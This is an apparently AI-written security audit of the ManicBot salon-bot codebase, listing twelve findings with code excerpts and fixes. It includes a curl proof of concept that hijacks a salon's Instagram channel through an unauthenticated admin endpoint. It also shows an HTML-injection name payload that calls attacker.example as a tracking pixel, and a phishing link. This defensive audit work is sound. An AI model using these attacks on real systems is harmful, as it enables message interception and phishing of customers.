# Security Audit — ManicBot — 2026-05-19

**Reviewer:** independent source-level audit (Claude, Opus 4.7)
**Commit reviewed:** `5cbe83d` (50 commits ahead of `origin/main 1d46c74`; CLAUDE.md timestamped 2026-05-18)
**Scope:** Worker (`manicbot/src/**`), Admin-app (`manicbot/admin-app/src/**`), Plugins (`manicbot/plugins/**`), Migrations (`manicbot/migrations/*.sql`), `.github/workflows/*`.
**Method:** static review of HTTP handlers, all tRPC routers, channel adapters, OAuth flows, webhook signature validators, encryption primitives, and recent (50-commit) diffs. Three parallel deep-dive sub-agents + targeted hand-verification of each candidate finding.

> Pre-read: `CLAUDE.md` (full), `manicbot/SECURITY_FINDINGS.md` (full, v3.1 post-remediation), `manicbot/plugins/SECURITY.md`, recent commits.

---

## Executive Summary

- **Total new findings:** 12 (P0: 1, P1: 4, P2: 7).
- **Critical paths:**
  1. **🚨 IMMEDIATE ACTION — IG channel hijack** via unauthenticated `/admin/ig-set-direct-token` when the target tenant's IG identifier columns are NULL. `publicSalon.getProfile` returns `tenant.id` unauthenticated, so the only secret needed is a free IGAA token from the attacker's own IG Tester account. Successful exploitation re-binds the salon's Instagram inbound DMs (and outbound `/me/messages` sends) to the attacker's IG account, enabling client impersonation, message theft, and credential phishing of the salon's real customers.
  2. **Unauthenticated IG diagnostic abuse** (`/admin/ig-diag`, `/admin/ig-app-subscribe`) — information disclosure + DM-spam vector from any salon's IG.
  3. **KV-based webhook dedup race** (`claimTelegramUpdate / claimMetaMessage / claimWAMessage`) — concurrent retries can both pass the GET-then-PUT check, producing duplicate appointments, duplicate AI replies, and duplicate marketing sends.

- **Time to remediate everything in this report:** ~22 engineer-hours (P0 + all P1s: ~8h; remaining P2 hardening: ~14h).

**Out-of-scope (already remediated, see `SECURITY_FINDINGS.md` v3.1):** ADMIN_KEY URL-param, support router publicProcedure, marketing_contacts cross-tenant UNIQUE (N7), N1–N6, M1–M7, H1–H7, L1–L7. Those entries are NOT re-listed here; only ID references where relevant.

---

## Сводная таблица фиксов

| # | Severity | File:Line | Vector | Что починить | Часы | Status |
|---|---|---|---|---|---|---|
| A1 | **P0** | `manicbot/src/http/adminKeyHttp.js:511-516` | Channel hijack / inbound-traffic interception | Invert `expectedIg` gate so empty → reject; require Bearer ADMIN_KEY on this endpoint regardless. Backfill `ig_business_id` on existing rows from `/me`. | 1.5 | open |
| A2 | **P1** | `manicbot/src/http/adminKeyHttp.js:558-609` | DM-spam at salon expense + information disclosure | Add Bearer ADMIN_KEY check; drop `psid` outbound-send branch entirely OR move it under a stricter operator-only path. | 1 | open |
| A3 | **P1** | `manicbot/src/http/adminKeyHttp.js:615-654` | Unauthenticated app-subscription mutation | Add Bearer ADMIN_KEY check. | 0.5 | open |
| A4 | **P1** | `manicbot/src/utils/dedup.js:25-50` | Webhook replay → duplicate appointments / AI replies / marketing sends | Move dedup claim from KV (GET+PUT race) to D1 `INSERT OR IGNORE` against a `webhook_dedup` table, OR to a Durable Object. | 3 | open |
| A5 | **P1** | `manicbot/src/services/upload.js:81-91` + `src/http/uploadHttp.js:128-146` | Stolen upload token replay (token leaks via Referer / browser history) | Bind upload token to `web_user_id`; either embed in payload + verify against session, or use single-use nonce with R2 GET-after-PUT consume. | 2 | open |
| A6 | **P2** | `manicbot/admin-app/src/server/email/templates.ts:595-746` | HTML injection in transactional emails (tracking pixels, phishing links via `<a>`) | Move `paragraph()` to escape its `text` argument by default; introduce `paragraphRaw()` (or `paragraphHtml()`) only for trusted-literal call sites and audit every existing caller. | 2 | open |
| A7 | **P2** | `manicbot/admin-app/src/server/api/routers/appointments.ts:104-187` | Cross-tenant accidental write by `system_admin` (no defense-in-depth tenant filter) | Require `tenantId` in the input + add it to every `WHERE` clause (defense-in-depth on top of `adminProcedure`). | 1 | open |
| A8 | **P2** | `manicbot/migrations/0074_*.sql`, `0075_*.sql`, `0077_*.sql` | Schema-ordering ambiguity + dev confusion | Rename second file of each colliding pair to next free number (e.g. `0078_…`); update the `d1_migrations` audit table accordingly via a follow-up rename migration. | 1.5 | open |
| A9 | **P2** | `manicbot/src/channels/resolver.js:226-245` | Token re-encryption TOCTOU under concurrent webhooks | Make the re-encrypt UPDATE conditional on the old ciphertext (`WHERE token_encrypted = ?` with the original ciphertext) so a racing writer is a no-op. | 1 | open |
| A10 | **P2** | `manicbot/src/http/trackHttp.js:42-56` | Per-isolate-only rate limiter; bypassable via isolate spread | Switch to D1-backed `checkRateLimit` (same helper the admin-app uses); keep in-memory bucket as a fast-path cache. | 1.5 | open |
| A11 | **P2** | `manicbot/src/http/adminKeyHttp.js:673-810` | Recovery-flow misuse window | Tighten `/admin/ig-recover` Gate 1: also reject when `BOT_ENCRYPTION_KEY_OLD` is set and decrypt-with-old works — that signals an in-flight rotation, not a key loss. Keep Bearer-key off (designed) but log every fire to a high-signal `audit` row. | 1 | open |
| A12 | **P2** | `manicbot/src/http/uploadHttp.js:46-73` | WEBP polyglot validation skips RIFF size field | Validate the RIFF size field (`bytes[4..7]`) is plausible (`>= 4 && <= bytes.length - 8`). Defense-in-depth only — primary `X-Content-Type-Options: nosniff` is already in place. | 0.5 | open |

Total: **~16.5h** core (P0 + P1 + the most exposed P2s) → padded to 22h with regression tests.

---

## Утечки базы данных

### (No new P0/P1 leaks found beyond `SECURITY_FINDINGS.md` v3.1.)

`tenantAccess.ts` (`assertTenantOwner` / `assertTenantMember`) is the single bottleneck used by every owner-facing tRPC procedure; both check `ctx.webUser.tenantId === tenantId` (`tenantAccess.ts:25,45`) with `null` rejection (`:18-21,40-42`), and the JWT callback re-queries `web_users.tenantId` on every request (`auth.ts:368-381`), so a session can't carry a stale tenant binding. Cross-cutting routers (`messenger`, `platformMessenger`, `clients`, `pluginReminders`, `pushSubscriptions`, `notifications`, `ownership`, `webUsers.getMyUiPrefs/setMyUiPrefs`, `metaOAuth.consume/finalize`, `master.requestPairingCode`, `salon.createMasterPairingCode`) each call assertion + add an explicit tenant filter in the WHERE. Spot-checked all of them at file:line for the routers' identified hot paths; no missing predicates found.

Two soft observations (`P2` only, listed below as A7) on `appointments.updateStatus` / `markNoShow` / `getAll` / `getStats` — they are `adminProcedure` (intentional cross-tenant God Mode per CLAUDE.md), so they are NOT P0 IDOR. But the UPDATE WHERE clause uses only `id`, allowing a system_admin who clicks the wrong row in the cross-tenant list to mutate it without a confirmation safety belt. Hardening is cheap.

### A7 — `appointments.updateStatus / markNoShow / getAll / getStats` lack defense-in-depth tenant scope — **P2**

**File:** `manicbot/admin-app/src/server/api/routers/appointments.ts:104-187` (mutations) + `:13-102` (queries).

```ts
updateStatus: adminProcedure
  .input(z.object({ id: z.string(), status: z.enum([...]), ... }))
  .mutation(async ({ ctx, input }) => {
    // ...
    await ctx.db.update(appointments).set(updates)
      .where(eq(appointments.id, input.id));   // ← no tenant predicate
```

**Posture:** `adminProcedure` ensures only `system_admin` can hit it (per `trpc.ts:202-218`). That is intentional cross-tenant God Mode. The risk is human error, not an exploit: a sysadmin viewing the "all tenants" page can write the wrong row if they hold two open tabs. The `getAll` / `getStats` queries similarly allow `tenantId` to be omitted (`appointments.ts:13-102`), which is by-design but means a sysadmin who forgets to filter gets aggregated cross-tenant numbers.

**Fix:** Require `tenantId` in the input zod schema; add `eq(appointments.tenantId, input.tenantId)` to every WHERE; let the UI carry the active-tenant filter forward into the mutation. Cheap defense-in-depth.

**Not exploitable today** — listed only because the audit charter asked for "missing tenant filter even with the assertion" as a class.

---

## Перехват сообщений

### A1 — IG channel hijack via `/admin/ig-set-direct-token` empty-`expectedIg` bypass — **🚨 P0 IMMEDIATE ACTION**

**File:** `manicbot/src/http/adminKeyHttp.js:476-548` (handler), `:511-516` (the bypass).

```js
// Lines 511-516
const expectedIg = String(row.ig_business_id || cfg.instagram_business_id || cfg.ig_account_id || '');
if (expectedIg && String(meData.id) !== expectedIg) {
  return Response.json({
    error: `token belongs to IG ${meData.id} but channel_configs has ${expectedIg}`,
  }, { status: 403 });
}
```

**The bug:** the route has NO Bearer-key check (`adminKeyHttp.js:476` lacks the `isAdminKeyValid` call that fronts every sibling route). It is self-gated by `expectedIg`. When the channel row's three IG identifier columns are all NULL/empty, `expectedIg === ''`, the `if (expectedIg && …)` short-circuits to false, and the function proceeds to encrypt and store the attacker's token into `channel_configs.token_encrypted` (line 525-532).

**Pre-conditions an attacker needs (all trivial):**

1. **A target `tenantId`** — `publicSalon.getProfile` returns `id: tenant.id` to anonymous visitors of `https://manicbot.com/salon/<slug>`:

   ```ts
   // manicbot/admin-app/src/server/api/routers/publicSalon.ts:181
   return {
     id: tenant.id,         // ← leaked unauthenticated
     slug: tenant.slug,
     publicActive: 1 as const,
     // ...
   ```

   So every public salon's tenantId can be scraped from its public profile JSON. No authentication needed.

2. **An IG channel row where all three identifier columns are NULL** — produced by:
   - `/admin/ig-channel` provisioning calls that omit `igAccountId` + `instagramBusinessId` (`adminKeyHttp.js:881-921`):

     ```js
     const config = { page_id: String(pageId) };
     if (igAccountId) config.ig_account_id = String(igAccountId);
     if (instagramBusinessId) config.instagram_business_id = String(instagramBusinessId);
     ```

     With both omitted, `instagram_business_id` is NOT in `config`, AND the typed `ig_business_id` column (`token-manager.js:154`) is NULL because `config.instagram_business_id` is `undefined`. ALL THREE candidates are empty → vulnerable.
   - Legacy IG channels created before the OAuth flow (commit `a017dcc`) landed.

3. **A free IGAA-prefixed Instagram Login token** — the attacker generates one against their own IG Business / IG Tester account in 30 seconds via Meta's App Dashboard.

**Attack PoC (one POST):**

```bash
TARGET_TENANT=$(curl -s https://manicbot.com/salon/<target-slug>/api/profile | jq -r .id)
# (any non-OAuth-provisioned IG-enabled salon)

curl -X POST https://manicbot.com/admin/ig-set-direct-token \
     -H 'Content-Type: application/json' \
     -d "{\"tenantId\":\"$TARGET_TENANT\",\"token\":\"IGAA<attacker_token>\"}"

# Server side:
#   • Line 488: dbGet returns row { id, page_id, ig_business_id=NULL, config='{}' }
#   • Line 496: graph.instagram.com/me returns { id: '<attacker_ig_user_id>', username: '<attacker>' }
#   • Line 511: expectedIg === ''        → the guard never trips
#   • Line 518: encryptToken(attacker_token, BOT_ENCRYPTION_KEY, 'channel-token-v1')
#   • Line 525-532: UPDATE channel_configs SET token_encrypted=<attacker>, config={api:'instagram_direct',ig_user_id:<attacker_id>...}
# Response: 200 { ok: true, igUserId: <attacker_id>, configApi: 'instagram_direct' }
```

**Impact post-exploit:**

- **Inbound DMs are now routed to the attacker** because `channels/resolver.js:107-119` matches inbound IG webhooks by `page_id` (still the salon's) OR by `ig_account_id`/`instagram_business_id` (now `cfg.ig_user_id = <attacker_id>`). Outbound sends from the salon (booking confirmations, reminders, "your appointment is confirmed") go to attacker's Graph endpoint — Meta returns an OK for messages to PSIDs the attacker controls.
- **Client impersonation:** the attacker can DM salon customers from `@attacker_ig` with the salon's branding "voice" via the bot's reply flow. Phishing CTA into a fake "rebook here" → credentials harvest.
- **Salon outbound is hijacked** — every staff-initiated reply (`/admin/messenger-outbound`) now sends via the attacker's IG token.
- **No alarm** — the salon's IG keeps "looking fine" in the Channels tab (`channel_configs.active` stays 1; the row's `page_id` is unchanged). The first observable signal is customer complaints about "the salon" asking for credit-card details.

**Recommended fix (both layers):**

1. Add the Bearer check that every sibling admin route has:
   ```js
   if (request.method === 'POST' && url.pathname === '/admin/ig-set-direct-token') {
     if (!isAdminKeyValid(url, env, request)) return forbidden();
     // ... rest unchanged
   ```
2. Invert the self-gate so `expectedIg === ''` REJECTS, not bypasses:
   ```js
   if (!expectedIg) {
     return Response.json({
       error: 'channel row has no IG identifier — refuse to bind. Backfill ig_business_id first.'
     }, { status: 409 });
   }
   if (String(meData.id) !== expectedIg) {
     return Response.json({ error: 'token IG id mismatch' }, { status: 403 });
   }
   ```
3. Backfill `ig_business_id` on every legacy row from the current decrypted token's `/me` response (one-shot script).

**Effort:** 1.5h (fix + backfill script + regression test).

---

### A2 — `/admin/ig-diag` is unauthenticated and can send DMs at the salon's expense — **P1**

**File:** `manicbot/src/http/adminKeyHttp.js:558-609`.

```js
if (request.method === 'POST' && url.pathname === '/admin/ig-diag') {
  if (!env.DB) return Response.json({ error: 'DB not bound' }, { status: 500 });
  if (!env.BOT_ENCRYPTION_KEY) return Response.json({ error: 'no enc key' }, { status: 503 });
  try {
    const { tenantId, psid } = await request.json().catch(() => ({}));
    // ... no auth check anywhere in the handler ...
    if (psid) {
      const payload = JSON.stringify({
        recipient: { id: String(psid) },
        message: { text: 'ManicBot diagnostic ping (ignore)' },
        // ...
      });
      const sendR = await fetch(`https://graph.facebook.com/v21.0/me/messages?access_token=…`, …);
```

**Pre-conditions:** target tenantId (leaked publicly, see A1 §1) + attacker-supplied IG PSID.

**Abuse vectors:**
- **DM-spam at salon's reputation cost.** Attacker hits the endpoint repeatedly with rotating PSIDs from public IG follower lists. Each call sends "ManicBot diagnostic ping (ignore)" from the salon's verified IG to a victim. Salon gets reported to Meta for unsolicited DMs → channel risk.
- **PSID validity oracle.** Response shape (`testSend.ok`, `testSend.status`, Graph error body) lets the attacker enumerate which PSIDs are valid contacts for the salon.
- **Information disclosure.** The endpoint returns the salon's `page_id`, Meta App ID, `subscribed_apps`, and `/me` even WITHOUT a `psid`. Useful recon for the A1 attack flow.

**Fix:** require Bearer ADMIN_KEY (same pattern as `/admin/ig-resubscribe` / `/admin/ig-channel`). Drop the `psid` outbound branch — operators have `/admin/ig-send-test` (already key-gated) for that.

**Effort:** 1h (add gate + test).

---

### A3 — `/admin/ig-app-subscribe` is unauthenticated — **P1**

**File:** `manicbot/src/http/adminKeyHttp.js:615-654`.

The route lacks a Bearer check. It uses only env credentials (META_APP_ID + META_APP_SECRET), so a leaked customer-token attack is out of scope — but anyone can spam Meta's App Dashboard subscription endpoint with re-subscribe POSTs from your worker. That risks:

- Meta-side abuse rate limits on the App's `/subscriptions` endpoint.
- Plausible deniability gap for ops — every attacker-driven re-subscription writes `admin.ig_resubscribe`-class events into the activity feed.

**Fix:** add `if (!isAdminKeyValid(url, env, request)) return forbidden();` at line 615.

**Effort:** 0.5h.

---

### A4 — Webhook dedup race lets duplicates through (Telegram / IG / WA) — **P1**

**File:** `manicbot/src/utils/dedup.js:25-72`.

```js
export async function claimTelegramUpdate(env, botId, updateId) {
  const kv = env?.MANICBOT || env?.kv;
  if (!kv?.put || !kv?.get) return true;
  const key = `tg:upd:${botId}:${updateId}`;
  const seen = await kv.get(key);     // ← (1)
  if (seen) return false;
  await kv.put(key, '1', { expirationTtl: TG_TTL_SEC }); // ← (2)
  return true;
}
```

GET (1) then PUT (2) on a non-atomic KV. Cloudflare KV is eventually consistent; two webhook retries firing within ~60s on different isolates can both miss the GET, both PUT, both process. This is the standard KV TOCTOU shape — the same code structure repeats in `claimMetaMessage` (`:42-50`) and `claimWAMessage` (`:64-72`).

**Realistic trigger:** Meta retries WhatsApp/IG webhooks for up to 24h on 5xx. A worker `503` from `validateSecurityConfig` (transient binding hiccup) followed by a retry pair, OR Telegram's `setWebhook` re-sending after a transient ack failure, AND the parallel queue cron consumer processing the same backfill bucket, all converge on the same `updateId`/`mid`. Production observable consequences:

- **Duplicate appointment rows** — the booking-confirmation callback processed twice writes two appointments for the same time slot.
- **Duplicate AI replies** — clients see two "Я могу записать вас на 14:00" messages.
- **Duplicate marketing-automation fires** — `dispatchAppointmentAutomation` ran twice = two "thank you for your visit, leave a review" messages.
- **Duplicate `analytics_events`** rows — skews funnels.

**Fix:** move the claim from KV to D1 with `INSERT OR IGNORE INTO webhook_dedup(key) VALUES (?) RETURNING ...` and rely on the primary-key uniqueness. SQLite gives transactional atomicity for that. Or upgrade to a Durable Object that owns the `(channel, msgId)` namespace.

**Effort:** 3h (table + migration + helper rewrite + test).

---

### A11 — `/admin/ig-recover` runs even when both keys decrypt the live token — **P2**

**File:** `manicbot/src/http/adminKeyHttp.js:697-708`.

The recovery flow's Gate 1 only blocks when the existing token decrypts under EITHER `BOT_ENCRYPTION_KEY` or `BOT_ENCRYPTION_KEY_OLD`:

```js
if (row.token_encrypted) {
  const { plain } = await decryptTokenWithFallback(
    row.token_encrypted, env.BOT_ENCRYPTION_KEY,
    env.BOT_ENCRYPTION_KEY_OLD || null, 'channel-token-v1',
  );
  if (plain) { /* refuse */ }
}
```

That is correct for the documented failure mode. But during an in-flight key rotation, the operator may have already deployed the new key but not yet re-encrypted every row, so the token decrypts via `*_OLD` and Gate 1 holds. Meanwhile Gate 2 (caller-controlled Page) is a permissive operator-authority check, not "is this caller the salon owner". The combined gate doesn't catch the case where rotation noise lets a determined Meta-Page operator (sub-admin level) impose a different long-lived token before the salon owner notices.

**Fix:** when `BOT_ENCRYPTION_KEY_OLD` is set, refuse `/admin/ig-recover` entirely; force ops to use `/admin/ig-token` (ADMIN_KEY-gated) during rotations.

**Effort:** 1h.

---

## Перехват запросов

### A5 — Upload tokens are not bound to `web_user_id` — **P1**

**File:** `manicbot/src/services/upload.js:81-91` (mint), `:101-131` (verify), `manicbot/src/http/uploadHttp.js:128-186` (consume).

```js
// upload.js:81-91
export async function signUploadToken({ tid, kind, secret, ttlSec = DEFAULT_TOKEN_TTL_SEC }) {
  // ...
  const payload = { tid, kind, exp: Math.floor(Date.now() / 1000) + ttlSec };
  // No webUserId binding — anyone holding the token can spend it.
  const payloadB64 = b64urlEncodeString(JSON.stringify(payload));
  const sig = await hmacSha256(secret, payloadB64);
  return `${payloadB64}.${b64urlEncode(sig)}`;
}
```

The token is HMAC-signed and TTL-bound (5 min), but its payload binds only `{ tid, kind }`. There's no `webUserId`. The token leaks easily:

- The token is passed in the URL (`/upload/asset?t=<token>&kind=...`) — survives in browser history, Workers access logs (Worker may log URLs), Cloudflare Pages access logs, R2-fronting CDN access logs, and any `Referer` header if the upload page navigates anywhere else.
- The R2 key format `t/{tid}/{kind}-{sha12}.{ext}` is content-addressed, so a stolen token within the 5-min window can upload any 2 MB file. Per `services/upload.js:20` the `kind` allow-list now includes `chat_attachment` and `client_avatar` — both attach to user-visible surfaces (ticket messages, client cards). An attacker who steals a token can plant an attacker-controlled image into a victim tenant's chat/clients view.

**Fix:** include `webUserId` in the token payload (server-known via session at mint time), and on consume require the request to carry the same web session and match. Or rotate to a single-use nonce + `INSERT OR IGNORE` consume row.

**Effort:** 2h.

---

### Webhook signatures — verified clean

- **Telegram** (`http/telegramWebhookHttp.js:22-36`): `X-Telegram-Bot-Api-Secret-Token` compared via `timingSafeEqual`; fail-closed when secret < 16 chars. ✅
- **Meta WA/IG** (`channels/meta-verify.js:22-46`, `http/metaWebhooksHttp.js:51,139-144`): HMAC-SHA256 on raw bytes; constant-time compare; correct dual-secret fallback for IG (`META_APP_SECRET` → `META_INSTAGRAM_APP_SECRET`); fail-fast 503 when `META_APP_SECRET` unset. ✅
- **Stripe** (`billing/webhooks.js:55-86`): HMAC v1 verification, timestamp window tightened to ±120s, constant-time hex compare. ✅
- **Resend** (`admin-app/src/app/api/resend/webhook/route.ts`): Svix-verified per CLAUDE.md and `marketing-webhook-resend.test.ts`. ✅
- **Meta OAuth state + draft** (`services/meta-oauth.js:546-572,621-648`): KV-backed single-use state; consume + finalize both check `draft.tenantId === input.tenantId && draft.webUserId === input.webUserId` — IDOR-safe. ✅
- **WebSocket** (`http/messengerWsHttp.js:47-52`): JWT-style token, claims include `tenantId`, mismatch with path-tenant rejected 403. ✅
- **Master pairing tokens** (`services/masterPairing.js:131-203`): hashed at rest, single-use via `consumed_at`, 7-day TTL, cross-tenant check (`:144-152`). ✅
- **Master invitations** (`webUsers.ts:1255-1359`): hashed token, 7-day TTL, status guard. Missing a per-token rate limit for brute-force, but entropy is 122 bits (UUIDv4) — not practically brute-forceable.
- **Ownership transfer** (`ownership.ts:239-348`): IP rate-limited, hashed token, single-use, re-checks eligibility at confirm-time.

---

## Прочее

### A6 — Email template `paragraph()` doesn't HTML-escape its `text` argument — **P2**

**File:** `manicbot/admin-app/src/server/email/templates.ts:595-597`, callers at `:668,690,737,1168,1169,1186,1202`.

```ts
function paragraph(text: string, color = "#d1d5db"): string {
  return `<p style="margin:0 0 12px;font-size:14px;line-height:1.6;color:${color};">${text}</p>`;
}
// caller at :737 — role-request admin email
paragraph(`<strong>${userName}</strong> (${userEmail})`, "#e2e8f0")
// caller at :1168-1169 — ownership transfer email
paragraph(`${c.body1}: <strong>${opts.tenantName}</strong>`, "#e2e8f0") +
paragraph(`${opts.toName} (<strong>${opts.toEmail}</strong>)`, "#d1d5db") +
```

`userName`, `tenantName`, `toName`, `oldOwnerName` come from `web_users.name` / `tenants.name` — both validated only by `z.string().min(1).max(200)` (no HTML strip). A user who registers with `name = '<img src="https://attacker.example/track?email=…" />'` will see that pixel render in every email sent by users on the same tenant (role-request notifications, ownership transfer notifications). Modern mail clients strip `<script>` and event handlers, but `<img>`, `<a>`, `<style>` are typically allowed:

- **Tracking pixel** — load on email open, leak the recipient's IP / UA / open timestamp.
- **Phishing anchor** — `<a href="https://evil/login">click here</a>` rendered inside an email "from ManicBot".

The salon-side `sanitize.ts` profile system exists and would block this if used. The fix is to default `paragraph()` to escape, and add an explicit `paragraphHtml()` for the few call sites that intentionally need literal `<strong>`.

**Effort:** 2h (helper change + audit ~20 call sites + new unit tests).

---

### A8 — Migration number collisions in `manicbot/migrations/` — **P2**

Four pairs of migrations share a numeric prefix:

```
0073_push_subscriptions.sql   0073_user_avatar.sql        ← user_avatar is a noop drift-fix (confirmed by comment)
0074_favorite_master.sql      0074_master_telegram_pairing.sql
0075_marketing_sends_complained.sql   0075_master_avatar.sql
0077_notification_prefs.sql   0077_service_categories.sql
```

`wrangler d1 migrations apply` (used in CI per `.github/workflows/deploy.yml:135-142`) tracks applied filenames in `d1_migrations` and runs ALL `.sql` files in alphabetical-by-name order — so both files of each pair run. **No P0 / P1 schema gap exists today** (confirmed by reading the actual SQL content of each pair).

But: the numeric prefix is the human ordering signal. With four pairs, the ordering between `0074_favorite_master.sql` and `0074_master_telegram_pairing.sql` is determined by alphabetical filename, which the engineer who wrote them didn't intentionally choose. A future migration that depends on rows added in the first 0074 might land before that row exists if a parallel deploy applies the other 0074 first on a fresh DB.

**Fix:** rename the second of each pair to the next free number (`0078_…`, `0079_…`, …). Wrangler's audit table will treat them as new migrations on existing tenants, so wrap each renamed file's content in a `SELECT 1 WHERE EXISTS(SELECT 1 FROM <evidence_table>)`-style noop guard, OR insert direct rows into `d1_migrations` via a one-shot SQL to mark them already applied. The fix here is process, not a security boundary.

**Effort:** 1.5h.

---

### A9 — Token re-encryption TOCTOU in `channels/resolver.js` — **P2**

**File:** `manicbot/src/channels/resolver.js:226-245`.

```js
const { plain, usedOldKey } = await decryptTokenWithFallback(
  rawTok, encKey, effOld, CHANNEL_TOKEN_LABEL,
);
token = plain;
if (token && usedOldKey) {
  const fresh = await encryptToken(plain, encKey, CHANNEL_TOKEN_LABEL);
  if (fresh && row.id) {
    await dbRun(ctx,
      'UPDATE channel_configs SET token_encrypted = ?, updated_at = ? WHERE id = ?',
      fresh, Math.floor(Date.now() / 1000), row.id,
    );
  }
}
```

Two concurrent webhooks land on the same tenant during a key rotation. Both call `getChannelConfig`, both see the OLD ciphertext, both decrypt (via old-key fallback), both encrypt fresh with the new key, both UPDATE. Result: two AES-GCM-encrypted versions of the same plaintext written back-to-back with different IVs. No correctness loss — the second write wins, the first is silently discarded — but worker CPU is wasted and a transient "decrypted-via-old-key" log fires twice per write.

**Fix:** make the UPDATE conditional on the original ciphertext:

```js
await dbRun(ctx,
  'UPDATE channel_configs SET token_encrypted = ?, updated_at = ? WHERE id = ? AND token_encrypted = ?',
  fresh, nowSec, row.id, rawTok,
);
```

Racing writer will match 0 rows and silently no-op. Cheap.

**Effort:** 1h.

---

### A10 — `/api/track` per-isolate in-memory rate limiter — **P2**

**File:** `manicbot/src/http/trackHttp.js:42-56`.

```js
const ipBuckets = new Map();
function rateLimitOk(ip) {
  const now = Date.now();
  const cutoff = now - TRACK_RATE_LIMIT_WINDOW_MS;
  const bucket = ipBuckets.get(ip) || [];
  // ...
}
```

`ipBuckets` lives in module scope = per-isolate. Cloudflare spawns multiple isolates per colo for hot endpoints. The same IP can hit two different isolates and double their effective per-window quota; under sustained load with isolate churn the limit becomes mostly advisory. Per the comment at line 38-40 this is acknowledged ("best-effort + cheap; the D1-backed rate limit on the admin-app side handles the durable case") but the admin-app rate limit doesn't apply to this endpoint.

**Fix:** swap to D1-backed `checkRateLimit` (same helper used by `webUsers.requestPasswordReset` and the consent router). Keep the in-memory bucket as a fast-path cache.

**Effort:** 1.5h.

---

### A12 — WEBP magic-byte check skips the RIFF size field — **P2**

**File:** `manicbot/src/http/uploadHttp.js:59-70`.

```js
if (declaredMime === 'image/webp') {
  if (bytes.length < 12) return false;
  return (
    bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
    bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50
  );
}
```

Bytes 4-7 of a RIFF container are the declared chunk size (little-endian). Skipping that lets an attacker craft `RIFF<bogus-size>WEBP<anything>` — a polyglot that LOOKS like a WEBP but smuggles arbitrary bytes. Combined with browsers that under unusual circumstances sniff (despite `X-Content-Type-Options: nosniff` we set at `:116`), this could matter. Today the CDN response always sets `nosniff + Content-Disposition: inline + Content-Type: image/webp`, so practical impact is low.

**Fix:** validate the size field:
```js
const riffSize = bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24);
if (riffSize < 4 || riffSize > bytes.length - 8) return false;
```

**Effort:** 0.5h.

---

### Verified-clean items (no new finding)

- **AI prompt injection** (`src/ai.js:35-65`): `sanitizeUserInput` covers NFKC + Unicode bracket variants + `[TAG:param]` collapse; `sanitizeTenantField` covers tenant-controlled strings before interpolation into the system prompt. Tag matching is case-insensitive. Action params validated by `validateActionParams` for `BOOK` / `CANCEL_ALL`. ✅
- **Chat HTML sanitizer** (`admin-app/src/components/chat/sanitizeChatHtml.ts`): whitelist of `b strong i em u s strike code pre br a`; `<a>` allows only `http(s)://` `href`; everything else is escaped to text. ✅
- **`sanitize-html` profiles** (`admin-app/src/server/security/sanitize.ts`): four profiles (`text` / `chat` / `salonBio` / `marketingHtml`), parser-based, `transformTags` enforces `rel=noopener noreferrer`, `allowedSchemes` constrained to http/https/mailto/tel, `style` attr disabled with `allowedStyles: {}`. ✅
- **`previewRole`** (`admin-app/src/components/RoleContext.tsx`): purely client-side React context. Verified via `grep -rn previewRole manicbot/admin-app/src/server/` — zero hits. tRPC reads `ctx.webUser.webRole` from the JWT session only. No server-side trust path; the previous audit's "P0 previewRole escalation" claim is a **false positive**, dismissed. ✅
- **Master pairing flow** (`services/masterPairing.js`): cross-tenant rejection at `:144-152`, single-use, expiry, partial-UNIQUE collision pre-check. ✅
- **Plugin invariants** (`plugins/SECURITY.md` + `assertPluginEnabled.ts`): role + plan + billing_state checked; install authorization requires owner OR system_admin; no plugin runtime router exists yet, so plugin-side IDOR surface is currently empty. ✅
- **Webhook content security** (`worker.js:145-182`): Strong default CSP, `frame-ancestors 'none'`, HSTS, Permissions-Policy. `addSecurityHeaders` is a floor, not an overwriter — middleware-set headers (e.g. `frame-ancestors 'self'` for `/salon/<slug>/chat`) win. ✅

---

## Уже известное (из `SECURITY_FINDINGS.md` v3.1) — НЕ дублирую

The following items are pre-existing and either fixed, accepted, or out of remediation scope per `manicbot/SECURITY_FINDINGS.md`:

- ✅ **H2 / M1** — ADMIN_KEY URL param removed; now Bearer-only with constant-time compare.
- ✅ **H3** — `connectBot` token encryption via `tokenEncryption.ts` mirror.
- ✅ **H4** — Support router migrated to `protectedProcedure`.
- ✅ **H5** — `INSTAGRAM_ACCESS_TOKEN` env fallback removed.
- ✅ **H6** — Next.js bumped to 15.5.18+.
- ✅ **H7** — Salon Day-view appointment status mutations migrated to `tenantOwnerProcedure`.
- ✅ **M2** — Logger redaction for tokens / secrets.
- ✅ **M4** — Marketing HTML sanitizer migrated to `sanitize-html`.
- ✅ **M5** — Worker CSP completed.
- ✅ **M7** — Stripe metadata `tenantId` validated against `stripe_customers`.
- ✅ **N1-N6** — Password reset / email change moved to 6-digit code (no URL); login alert IP scrubbed; role-decision note redacted; rate-limit-per-email added.
- ✅ **N5** — `assertCallerIsMaster` enforces `boundRow.chatId !== masterId`.
- ✅ **N7 (2026-05-16)** — `marketing_contacts.email` cross-tenant UNIQUE replaced with per-tenant partial UNIQUE in migration 0062.
- ✅ **N8 (2026-05-16)** — Block-sentinel handling restored in Worker booking callback.
- 🟦 **V1 / V2** — Reversible master-password storage + OTP gate, accepted-risk by design.
- 🟦 **M3** — Fixed-window rate limiter accepted-risk pending sliding-window refactor.
- 🟦 **L6** — Legacy `/admin` Basic auth accepted-risk; deprecation tracked.
- 🟦 **L7** — admin-app PBKDF2 100k iterations (edge cap); mitigated by 5-attempt lockout.

---

## Что НЕ проверено / out of scope

- **No runtime / pentest** — source-level review only. The exploit PoCs (especially A1) are derived from code reading; replay against a live environment was not performed (and the audit charter forbids it).
- **No npm dependency audit (CVE feed)** — only the per-package versions referenced in source review. Run `npm audit --omit=dev` on both `manicbot/` and `manicbot/admin-app/` separately for the full picture; per CLAUDE.md `M6` the postcss transitive is a known accepted-risk.
- **No GitHub Actions secret audit** — `.github/workflows/deploy.yml` was checked for migration ordering (A8); `secrets.*` references were not enumerated for over-privileged tokens or missing OIDC binding.
- **Plugin runtime auth** — currently zero plugin runtime routers exist in `manicbot/plugins/*/router.ts`. When the first plugin ships its own router (e.g. `reminders` is on a different path), the audit needs to revisit `assertPluginEnabled` from the perspective of bypass.
- **Durable Object code paths** — `MessengerHub` DO source not opened; only the WS upgrade gateway (`messengerWsHttp.js`) and the publisher (`publishToMessengerHub`) were reviewed.
